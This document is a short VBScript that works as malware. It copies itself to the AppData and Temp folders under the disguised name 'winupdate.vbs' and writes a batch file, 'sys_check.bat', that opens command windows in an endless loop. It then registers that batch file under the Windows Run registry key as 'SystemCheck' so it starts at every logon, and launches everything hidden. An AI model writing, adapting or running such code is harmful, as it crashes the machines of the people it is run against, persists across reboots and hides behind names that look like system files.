Set fso = CreateObject("Scripting.FileSystemObject")
Set shell = CreateObject("WScript.Shell")

batName = "sys_check.bat"
appDataPath = shell.ExpandEnvironmentStrings("%APPDATA%")
tempPath = shell.ExpandEnvironmentStrings("%TEMP%")

destAppData = appDataPath & "\" & batName
destTemp = tempPath & "\" & batName

fso.CopyFile WScript.ScriptFullName, appDataPath & "\winupdate.vbs", True
fso.CopyFile WScript.ScriptFullName, tempPath & "\winupdate.vbs", True

batContent = "@echo off" & vbCrLf & _
             ":bucle" & vbCrLf & _
             "start cmd.exe" & vbCrLf & _
             "goto bucle"
fso.CreateTextFile(destAppData, True).Write(batContent)
fso.CreateTextFile(destTemp, True).Write(batContent)

regKey = "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\"
regValue = "SystemCheck"

shell.RegWrite regKey & regValue, """" & destAppData & """", "REG_SZ"

shell.RegWrite regKey & "SystemCheckTemp", """" & destTemp & """", "REG_SZ"

shell.Run """" & destAppData & """", 0, False 

shell.Run """" & appDataPath & "\winupdate.vbs""" , 0, False